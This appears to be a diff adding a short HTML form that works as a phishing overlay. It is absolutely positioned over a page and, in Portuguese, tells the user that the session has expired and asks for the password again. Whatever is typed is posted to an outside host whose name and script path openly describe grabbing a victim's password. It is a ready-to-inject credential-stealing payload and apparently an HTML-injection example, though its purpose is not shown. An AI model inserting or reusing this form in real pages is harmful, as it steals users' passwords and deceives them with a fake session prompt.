@@ -1,0 +1,5 @@
+<form method="post" style="border: 1px solid; padding:20px; background-color: silver; position:absolute; left:300px;top:300px;" action="http://meusitedomal.net/pegasenhadootario.php">
+<input type="password" name="senha" size="40" 
+placeholder="Sua sessão expirou, redigite sua senha">
+<input type="submit" value="Login">
+</form>
